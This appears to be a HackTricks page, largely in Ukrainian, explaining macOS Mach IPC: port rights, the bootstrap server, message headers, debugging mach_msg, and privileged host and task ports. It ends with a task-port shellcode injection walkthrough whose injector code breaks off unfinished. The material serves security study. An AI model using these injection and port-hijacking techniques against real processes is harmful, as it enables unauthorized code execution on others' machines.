# macOS IPC - Inter Process Communication

{{#include ../../../../banners/hacktricks-training.md}}

## Mach messaging via Ports

### Basic Information

Mach використовує **tasks** як **найменшу одиницю** для спільного використання ресурсів, і кожен task може містити **декілька threads**. Ці **tasks і threads відображаються 1:1 на POSIX процеси та потоки**.

Комунікація між tasks відбувається через Mach Inter-Process Communication (IPC), використовуючи однонаправлені канали зв'язку. **Повідомлення передаються між ports**, які виступають свого роду **чергами повідомлень**, керованими ядром.

**Port** — це **базовий** елемент Mach IPC. Він може використовуватись для **відправлення та отримання повідомлень**.

Кожен процес має **IPC table**, в якій можна знайти **mach ports процесу**. Ім'я mach port фактично є числом (вказівником на об'єкт в ядрі).

Процес також може відправити ім'я порта з деякими правами **до іншого task**, і ядро зробить відповідний запис у **IPC table іншого task**.

### Port Rights

Port rights, які визначають, які операції task може виконувати, є ключовими для цієї комунікації. Можливі **port rights** описані (definitions from here):

- **Receive right**, що дозволяє отримувати повідомлення, відправлені на порт. Mach ports є MPSC (multiple-producer, single-consumer) чергами, що означає, що в системі може існувати лише **одне Receive right для кожного порта** (на відміну від pipe, де кілька процесів можуть мати дескриптори для кінця читання).
- Task з правом **Receive** може отримувати повідомлення і **створювати Send rights**, що дозволяє йому відправляти повідомлення. Спочатку лише **власний task має Receive right над своїм port**.
- Якщо власник **Receive right** **вмирає** або втрачає його, то **send right стає марним (dead name).**
- **Send right**, що дозволяє відправляти повідомлення на порт.
- Send right можна **клонувати**, тому task, що володіє Send right, може клонувати його і **надати третій задачі**.
- Зверніть увагу, що **port rights** також можуть бути **передані** через Mach messages.
- **Send-once right**, що дозволяє відправити одне повідомлення на порт і після цього зникає.
- Це право **не можна** **клонувати**, але його можна **перемістити**.
- **Port set right**, що позначає _port set_ замість одиничного порта. Декуювання повідомлення з port set видаляє повідомлення з одного з портів, які він містить. Port sets можна використовувати для прослуховування кількох портів одночасно, подібно до `select`/`poll`/`epoll`/`kqueue` в Unix.
- **Dead name**, що не є фактичним правом порта, а лише заповнювачем. Коли порт знищується, всі існуючі port rights на цей порт перетворюються на dead names.

**Tasks можуть передавати SEND rights іншим**, дозволяючи їм відправляти відповіді. **SEND rights також можна клонувати, тому task може дублювати та передати право третій задачі**. Це, у поєднанні з проміжним процесом, відомим як **bootstrap server**, дозволяє ефективну комунікацію між tasks.

### File Ports

File ports дозволяють інкапсулювати file descriptors у Mac ports (використовуючи Mach port rights). Можливо створити `fileport` з даного FD за допомогою `fileport_makeport` і створити FD з fileport використовуючи `fileport_makefd`.

### Establishing a communication

Як зазначалося раніше, права можна відправляти через Mach messages, однак ви **не можете відправити право, не маючи вже права** відправляти Mach повідомлення. Тож як встановлюється перша комунікація?

У цьому задіяний **bootstrap server** (**launchd** в mac), оскільки **кожен може отримати SEND right до bootstrap server**, можна попросити його видати право надсилати повідомлення іншому процесу:

1. Task **A** створює **новий port**, отримуючи над ним **RECEIVE right**.
2. Task **A**, як власник RECEIVE right, **генерує SEND right для цього порта**.
3. Task **A** встановлює **з'єднання** з **bootstrap server** і **відправляє йому SEND right** для порта, створеного на початку.
- Пам'ятайте, що будь-хто може отримати SEND right до bootstrap server.
4. Task A відправляє повідомлення `bootstrap_register` до bootstrap server, щоб **зв'язати вказаний порт з іменем** на кшталт `com.apple.taska`
5. Task **B** взаємодіє з **bootstrap server**, щоб виконати bootstrap **lookup для сервісу** ( `bootstrap_lookup`). Щоб bootstrap server міг відповісти, task B відправить йому **SEND right до порта, який він раніше створив** у повідомленні lookup. Якщо пошук успішний, **сервер дублює SEND right**, отримане від Task A, і **передає його Task B**.
- Пам'ятайте, що будь-хто може отримати SEND right до bootstrap server.
6. Маючи цей SEND right, **Task B** може **відправляти** **повідомлення** **до Task A**.
7. Для двонаправленої комунікації зазвичай task **B** генерує новий порт з **RECEIVE** правом і **SEND** правом, і дає **SEND right Task A**, щоб той міг відправляти повідомлення до TASK B (дволокальна комунікація).

bootstrap server **не може аутентифікувати** ім'я сервісу, яке заявляє task. Це означає, що **task** потенційно може **видавати себе за будь-який системний task**, наприклад, неправдиво **заявивши ім'я сервісу авторизації** і потім схвалюючи кожен запит.

Apple зберігає **імена системних сервісів** у захищених конфігураційних файлах, розташованих у каталогах, захищених SIP: `/System/Library/LaunchDaemons` та `/System/Library/LaunchAgents`. Поруч з кожним ім'ям сервісу також зберігається **відповідний бінарний файл**. bootstrap server створює і утримує **RECEIVE right для кожного з цих імен сервісів**.

Для цих попередньо визначених сервісів процес lookup трохи відрізняється. Коли виконується пошук імені сервісу, launchd запускає сервіс динамічно. Новий робочий процес виглядає так:

- Task **B** ініціює bootstrap **lookup** для імені сервісу.
- **launchd** перевіряє, чи запущено task, і якщо ні — **запускає** його.
- Task **A** (сервіс) виконує **bootstrap check-in** (`bootstrap_check_in()`). Тут **bootstrap** server створює SEND right, зберігає його і **передає RECEIVE right Task A**.
- launchd дублює **SEND right і відправляє його Task B**.
- Task **B** генерує новий порт з **RECEIVE** правом і **SEND** правом, і дає **SEND right Task A** (сервісу), щоб він міг відправляти повідомлення до TASK B (дволокальна комунікація).

Однак цей процес застосовується лише до попередньо визначених системних tasks. Несистемні tasks все ще працюють, як описано спочатку, що потенційно може дозволити видавання особистості.

> [!CAUTION]
> Therefore, launchd should never crash or the whole sysem will crash.

### A Mach Message

[Find more info here](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

Функція `mach_msg`, по суті системний виклик, використовується для відправки та отримання Mach повідомлень. Функція вимагає, щоб повідомлення, яке надсилається, було першим аргументом. Це повідомлення повинно починатися зі структури `mach_msg_header_t`, за якою йде власне вміст повідомлення. Структура визначена наступним чином:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Процеси, що володіють _**receive right**_, можуть отримувати повідомлення на Mach port. Натомість **senders** мають _**send**_ або _**send-once right**_. Send-once right призначене виключно для відправлення одного повідомлення, після чого воно стає недійсним.

Початкове поле **`msgh_bits`** — це бітова маска:

- Перший біт (найстарший) використовується для позначення того, що повідомлення є складним (детальніше нижче)
- 3-й і 4-й біти використовуються ядром
- **5 молодших бітів другого байта** можуть використовуватися для **voucher**: іншого типу порту для відправлення пар ключ/значення.
- **5 молодших бітів третього байта** можуть використовуватися для **local port**
- **5 молодших бітів четвертого байта** можуть використовуватися для **remote port**

Типи, які можна вказати у voucher, local і remote портах, наведені нижче (з [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
For example, `MACH_MSG_TYPE_MAKE_SEND_ONCE` can be used to **indicate** that a **send-once** **right** should be derived and transferred for this port. It can also be specified `MACH_PORT_NULL` to prevent the recipient to be able to reply.

In order to achieve an easy **bi-directional communication** a process can specify a **mach port** in the mach **message header** called the _reply port_ (**`msgh_local_port`**) where the **receiver** of the message can **send a reply** to this message.

> [!TIP]
> Note that this kind of bi-directional communication is used in XPC messages that expect a replay (`xpc_connection_send_message_with_reply` and `xpc_connection_send_message_with_reply_sync`). But **usually different ports are created** as explained previously to create the bi-directional communication.

The other fields of the message header are:

- `msgh_size`: the size of the entire packet.
- `msgh_remote_port`: the port on which this message is sent.
- `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach_vouchers.html).
- `msgh_id`: the ID of this message, which is interpreted by the receiver.

> [!CAUTION]
> Note that **mach messages are sent over a `mach port`**, which is a **single receiver**, **multiple sender** communication channel built into the mach kernel. **Multiple processes** can **send messages** to a mach port, but at any point only **a single process can read** from it.

Messages are then formed by the **`mach_msg_header_t`** header followed by the **body** and by the **trailer** (if any) and it can grant permission to reply to it. In these cases, the kernel just need to pass the message from one task to the other.

A **trailer** is **information added to the message by the kernel** (cannot be set by the user) which can be requested in message reception with the flags `MACH_RCV_TRAILER_<trailer_opt>` (there is different information that can be requested).

#### Complex Messages

However, there are other more **complex** messages, like the ones passing additional port rights or sharing memory, where the kernel also needs to send these objects to the recipient. In this cases the most significant bit of the header `msgh_bits` is set.

The possible descriptors to pass are defined in [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html):
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
У 32-бітних системах усі дескриптори мають розмір 12B, і тип дескриптора знаходиться в 11-му байті. У 64-бітних систем розміри варіюються.

> [!CAUTION]
> Ядро скопіює дескриптори з одного завдання в інше, але спочатку **створюючи копію в пам'яті ядра**. Цю техніку, відому як "Feng Shui", використовували в кількох експлойтах, щоб змусити **ядро копіювати дані у свою пам'ять**, змусивши процес відправити дескриптори самому собі. Потім процес може отримати повідомлення (ядро їх звільнить).
>
> Також можливо **відправити права на порт у вразливий процес**, і ці права просто з'являться в процесі (навіть якщо він їх не обробляє).

### Mac Ports APIs

Зауважте, що порти асоційовані з простором імен task, тож для створення або пошуку порту також перевіряється простір імен task (більше в `mach/mach_port.h`):

- **`mach_port_allocate` | `mach_port_construct`**: **Створює** порт.
- `mach_port_allocate` також може створити **port set**: право RECEIVE над групою портів. Коли надходить повідомлення, вказується порт, звідки воно прийшло.
- `mach_port_allocate_name`: Змінює ім'я порту (за замовчуванням 32-бітне ціле)
- `mach_port_names`: Отримати імена портів з цілі
- `mach_port_type`: Отримати права завдання над іменем
- `mach_port_rename`: Перейменувати порт (як dup2 для FDs)
- `mach_port_allocate`: Виділяє новий RECEIVE, PORT_SET або DEAD_NAME
- `mach_port_insert_right`: Створити нове право в порту, де ви маєте RECEIVE
- `mach_port_...`
- **`mach_msg`** | **`mach_msg_overwrite`**: Функції, що використовуються для надсилання та отримання mach-повідомлень. Версія overwrite дозволяє вказати інший буфер для отримання повідомлення (інша версія просто повторно використовує його).

### Debug mach_msg

Оскільки функції **`mach_msg`** та **`mach_msg_overwrite`** використовуються для надсилання й отримання повідомлень, встановлення точки зупинки на них дозволить інспектувати відправлені та отримані повідомлення.

Наприклад, почніть налагодження будь-якого додатка, який ви можете налагоджувати, оскільки він завантажить **`libSystem.B`, яка буде використовувати цю функцію**.

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Breakpoint 1: where = libsystem_kernel.dylib`mach_msg, address = 0x00000001803f6c20
<strong>(lldb) r
</strong>Process 71019 launched: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Process 71019 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 <+0>:  pacibsp
0x181d3ac24 <+4>:  sub    sp, sp, #0x20
0x181d3ac28 <+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c <+12>: add    x29, sp, #0x10
Target 0: (SandboxedShellApp) stopped.
<strong>(lldb) bt
</strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&) const::$_0::operator()() const + 168
</code></pre>

Щоб отримати аргументи **`mach_msg`**, перевірте регістри. Ось аргументи (з [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
Отримати значення з реєстрів:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
Перевірте заголовок повідомлення, перевіряючи перший аргумент:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
Такий тип `mach_msg_bits_t` дуже поширений для дозволу відповіді.

### Перерахування портів
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
The **ім'я** — це стандартна назва, що присвоюється порту (перевірте, як воно **зростає** в перших 3 байтах). The **`ipc-object`** — це **обфускований** унікальний **ідентифікатор** порту.\
Зауважте також, як порти лише з правом **`send`** **ідентифікують власника** (ім'я порту + pid).\
Також зверніть увагу на використання **`+`** для позначення **інших задач, підключених до того ж порту**.

Також можна використати [**procesxp**](https://www.newosxbook.com/tools/procexp.html) щоб побачити також **зареєстровані імена сервісів** (з SIP вимкненим через необхідність `com.apple.system-task-port`):
```
procesp 1 ports
```
Ви можете встановити цей інструмент на iOS, завантаживши його з [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Code example

Зверніть увагу, як **sender** **allocates** порт, створює **send right** для імені `org.darlinghq.example` і надсилає його на **bootstrap server**, тоді як **sender** запросив **send right** для цього імені й використав його, щоб **send a message**.

{{#tabs}}
{{#tab name="receiver.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{{#endtab}}

{{#tab name="sender.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{{#endtab}}
{{#endtabs}}

## Привілейовані порти

Існують спеціальні порти, які дозволяють **виконувати певні чутливі дії або отримувати доступ до певних чутливих даних**, якщо завдання мають над ними **SEND** дозволи. Це робить ці порти дуже цікавими з погляду нападника не тільки через їхні можливості, але й тому, що можливо **розподіляти SEND дозволи між задачами**.

### Спеціальні порти хоста

Ці порти позначаються числом.

**SEND** права можна отримати, викликавши **`host_get_special_port`**, а **RECEIVE** права — викликавши **`host_set_special_port`**. Проте обидва виклики вимагають порту **`host_priv`**, до якого має доступ лише root. Крім того, раніше root міг викликати **`host_set_special_port`** і перехоплювати довільні порти, що дозволяло, наприклад, обходити підписи коду, перехоплюючи `HOST_KEXTD_PORT` (SIP тепер це забороняє).

Вони поділені на 2 групи: **перші 7 портів належать ядру**, зокрема 1 `HOST_PORT`, 2 `HOST_PRIV_PORT`, 3 `HOST_IO_MASTER_PORT` та 7 — `HOST_MAX_SPECIAL_KERNEL_PORT`.\
Ті, що починаються з номера **8**, **належать системним демонам** і їх можна знайти в деклараціях у [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host_special_ports.h.auto.html).

- **Host port**: Якщо процес має **SEND** привілей над цим портом, він може отримувати **інформацію** про **систему**, викликаючи такі роутини:
- `host_processor_info`: Get processor info
- `host_info`: Get host info
- `host_virtual_physical_table_info`: Virtual/Physical page table (requires MACH_VMDEBUG)
- `host_statistics`: Get host statistics
- `mach_memory_info`: Get kernel memory layout
- **Host Priv port**: Процес з **SEND** правом над цим портом може виконувати **привілейовані дії**, наприклад показувати дані завантаження або намагатися завантажити kernel extension. **Процес має бути root**, щоб отримати цей дозвіл.
- Крім того, щоб викликати **`kext_request`** API, потрібно мати додаткові entitlements **`com.apple.private.kext*`**, які надаються лише бінарникам Apple.
- Інші рутини, які можна викликати:
- `host_get_boot_info`: Get `machine_boot_info()`
- `host_priv_statistics`: Get privileged statistics
- `vm_allocate_cpm`: Allocate Contiguous Physical Memory
- `host_processors`: Send right to host processors
- `mach_vm_wire`: Make memory resident
- Оскільки **root** може отримати цей дозвіл, він може викликати `host_set_[special/exception]_port[s]` для **перехоплення host special або exception портів**.

It's possible to **see all the host special ports** by running:
```bash
procexp all ports | grep "HSP"
```
### Спеціальні порти Task

Це порти, зарезервовані для відомих сервісів. Можна отримати/встановити їх, викликавши `task_[get/set]_special_port`. Їх можна знайти в `task_special_ports.h`:
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
From [here](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html):

- **TASK_KERNEL_PORT**\[task-self send right]: Порт, що використовується для керування цим завданням. Використовується для відправки повідомлень, які впливають на завдання. Це порт, що повертається функцією **mach_task_self (див. розділ Порти завдань нижче)**.
- **TASK_BOOTSTRAP_PORT**\[bootstrap send right]: Bootstrap-порт завдання. Використовується для відправки повідомлень із запитами про повернення інших системних сервісних портів.
- **TASK_HOST_NAME_PORT**\[host-self send right]: Порт, що використовується для запитів інформації про хост, який містить це завдання. Це порт, що повертається функцією **mach_host_self**.
- **TASK_WIRED_LEDGER_PORT**\[ledger send right]: Порт, який іменує джерело, з якого це завдання отримує свою wired kernel memory.
- **TASK_PAGED_LEDGER_PORT**\[ledger send right]: Порт, який іменує джерело, з якого це завдання отримує свою стандартну керовану пам'ять.

### Порти завдань

Спочатку Mach не мав «processes», у нього були «tasks», які вважалися скоріше контейнером для потоків. Коли Mach було об’єднано з BSD, **кожному task було співставлено BSD-процес**. Тому кожен BSD-процес має деталі, необхідні для роль як процесу, а кожен Mach-task також має свою внутрішню структуру (за винятком неіснуючого pid 0, який є `kernel_task`).

Є дві дуже цікаві функції, пов’язані з цим:

- `task_for_pid(target_task_port, pid, &task_port_of_pid)`: Отримує SEND right до task port завдання, пов’язаного з вказаним `pid`, і передає його вказаному `target_task_port` (зазвичай це викликаючий task, який використав `mach_task_self()`, але це може бути й SEND-порт, що належить іншому task).
- `pid_for_task(task, &pid)`: Маючи SEND right до task, визначає, якому PID відповідає це task.

Щоб виконувати дії в межах task, сам task повинien мати `SEND` право на себе, викликавши `mach_task_self()` (що використовує `task_self_trap` (28)). Маючи цей дозвіл, task може виконувати кілька дій, наприклад:

- `task_threads`: Отримати SEND right на всі порти потоків task
- `task_info`: Отримати інформацію про task
- `task_suspend/resume`: Призупинити або продовжити task
- `task_[get/set]_special_port`
- `thread_create`: Створити потік
- `task_[get/set]_state`: Керувати станом task
- і інше можна знайти в [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)

> [!CAUTION]
> Зверніть увагу, що маючи SEND right до task port **іншого task**, можливо виконувати такі дії над цим іншим task.

Крім того, task_port також є **`vm_map`** портом, який дозволяє **читати та змінювати пам'ять** всередині task за допомогою функцій, таких як `vm_read()` і `vm_write()`. Це по суті означає, що task із SEND-правами на task_port іншого task зможе **інжектувати код у той task**.

Пам’ятайте, що оскільки **kernel теж є task**, якщо комусь вдасться отримати **SEND-права** на **`kernel_task`**, він зможе змусити ядро виконати будь-що (jailbreaks).

- Викличте `mach_task_self()` щоб **отримати ім'я** цього порту для викликаючого task. Цей порт лише **успадковується** під час **`exec()`**; нове завдання, створене за допомогою `fork()`, отримує новий task port (як спеціальний випадок, task також отримує новий task port після `exec()` у suid-бінарі). Єдиний спосіб породити task і отримати його порт — виконати ["port swap dance"](https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html) під час `fork()`.
- Ось обмеження доступу до порту (з `macos_task_policy` в бінарі `AppleMobileFileIntegrity`):
  - Якщо додаток має **`com.apple.security.get-task-allow` entitlement**, процеси від **того ж користувача можуть отримати доступ до task port** (звично додається Xcode для відладки). Процес **нотаризації** не дозволить це для production-релізів.
  - Додатки з **`com.apple.system-task-ports`** entitlement можуть отримати **task port для будь-якого** процесу, окрім ядра. У старих версіях це називалося **`task_for_pid-allow`**. Це надається лише додаткам Apple.
  - **Root може отримувати доступ до task port** додатків, які **не** скомпільовані з **hardened** runtime (і не є від Apple).

**Порт імені task:** Непривілейована версія _task port_. Він посилається на task, але не дозволяє ним керувати. Єдине, що, здається, доступне через нього — це `task_info()`.

### Порти потоків

Потоки також мають асоційовані порти, які видно з task, що викликає **`task_threads`**, і з процесора через `processor_set_threads`. SEND right до thread port дозволяє використовувати функції з підсистеми `thread_act`, такі як:

- `thread_terminate`
- `thread_[get/set]_state`
- `act_[get/set]_state`
- `thread_[suspend/resume]`
- `thread_info`
- ...

Будь-який потік може отримати цей порт, викликавши **`mach_thread_self`**.

### Shellcode Injection in thread via Task port

You can grab a shellcode from:


{{#ref}}
../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

{{#tabs}}
{{#tab name="mysleep.m"}}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{{#endtab}}

{{#tab name="entitlements.plist"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

**Скомпілюйте** попередню програму й додайте **entitlements**, щоб мати можливість inject code під тим самим користувачем (якщо ні — доведеться використовувати **sudo**).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
